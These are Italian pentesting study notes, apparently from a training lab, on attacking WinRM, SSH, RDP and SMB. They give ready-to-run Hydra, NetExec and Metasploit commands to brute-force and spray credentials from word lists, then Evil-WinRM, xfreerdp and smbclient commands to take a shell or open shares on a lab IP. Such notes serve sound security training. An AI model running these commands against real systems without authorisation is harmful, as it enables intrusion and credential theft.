# Network Services — Guida ai Servizi di Rete

Panoramica dei principali servizi di rete usati nel pentesting, con tool e metodologie di attacco per ciascuno.

---

## 1. WinRM (Windows Remote Management)

È il protocollo ufficiale Microsoft per gestire i sistemi Windows da linea di comando.

- **Porte di default:** 5985 (HTTP) e 5986 (HTTPS)
- **Uso:** Gestione remota via PowerShell senza desktop grafico

### Attacco con NetExec

NetExec è lo strumento ideale per testare liste di utenti e password contemporaneamente.
Se accanto al risultato vedi la scritta **`(Pwn3d!)`**, significa che hai trovato la password corretta e hai i permessi per controllare la macchina.

```bash
sudo apt-get -y install netexec
netexec smb -h
nxc <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
nxc winrm 10.129.42.197 -u user.list -p password.list
```

### Shell con Evil-WinRM

Una volta scoperta la password con NetExec, usi Evil-WinRM per entrare dentro la macchina e ottenere un terminale PowerShell interattivo.

```bash
sudo gem install evil-winrm
evil-winrm -i <target-IP> -u <username> -p <password>
evil-winrm -i 10.129.42.197 -u user -p password
```

---

## 2. SSH (Secure Shell)

È il re della gestione remota, usato principalmente su Linux (ma a volte anche su Windows). Funziona sulla **porta 22**.

### Crittografia SSH

1. **Simmetrica:** Client e server usano la stessa chiave per scambiare dati (es. AES)
2. **Asimmetrica:** Usa una chiave pubblica (che hanno tutti) e una privata (segreta). Se un hacker ruba la chiave privata, può entrare nel server senza bisogno di password
3. **Hashing:** Una funzione matematica a senso unico usata per verificare che i messaggi non siano stati alterati durante il viaggio

### Brute force con Hydra

```bash
hydra -L user.list -P password.list ssh://10.129.42.197
```

### Connessione SSH

Una volta trovata la password, usi il classico comando ssh per connetterti:

```bash
ssh utente@<IP>
```

---

## 3. RDP (Remote Desktop Protocol)

È il desktop remoto di Windows, quello che ti permette di vedere lo schermo grafico (GUI) del server. Funziona sulla **porta 3389**.

### Brute force con Hydra

```bash
hydra -L user.list -P password.list rdp://10.129.42.197
```

### Connessione con xfreerdp

xfreerdp è il tool consigliato per Linux per aprire la finestra grafica del desktop remoto Windows.

```bash
xfreerdp /v:<target-IP> /u:<username> /p:<password>
xfreerdp /v:10.129.42.197 /u:user /p:password
```

---

## 4. SMB (Server Message Block)

È il protocollo usato per condividere file, cartelle e stampanti in una rete Windows. Funziona sulla **porta 445**.

### Brute force con Hydra

> **Attenzione:** Le vecchie versioni di Hydra falliscono contro i Windows moderni (errore `invalid reply`) perché non supportano SMBv3. Aggiorna Hydra o usa Metasploit/NetExec come alternativa.

```bash
hydra -L user.list -P password.list smb://10.129.42.197
```

### Brute force con Metasploit

Per superare il problema di Hydra, si usa il modulo di Metasploit:

```bash
msfconsole -q
use auxiliary/scanner/smb/smb_login
set user_file user.list
set pass_file password.list
set rhosts 10.129.42.197
run
```

### Controllo permessi con NetExec

Con il flag `--shares`, NetExec mostra l'elenco delle cartelle condivise sul server e dice se puoi solo leggerle (`READ`) o anche modificarle (`WRITE`).

```bash
nxc smb 10.129.42.197 -u "user" -p "password" --shares
```

### Accesso con smbclient

smbclient è lo strumento per entrare nella cartella condivisa (come una chiavetta USB in rete) per scaricare o caricare file.

```bash
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

---

## Tool consigliati

| Tool | Uso principale |
|------|---------------|
| **NetExec** | Password spraying, enum share, esecuzione remota |
| **Hydra** | Brute force multi-protocollo |
| **Evil-WinRM** | Shell PowerShell via WinRM |
| **xfreerdp** | Client RDP per Linux |
| **smbclient** | Accesso share SMB |
| **Metasploit** | Framework completo (moduli brute force, exploit) |
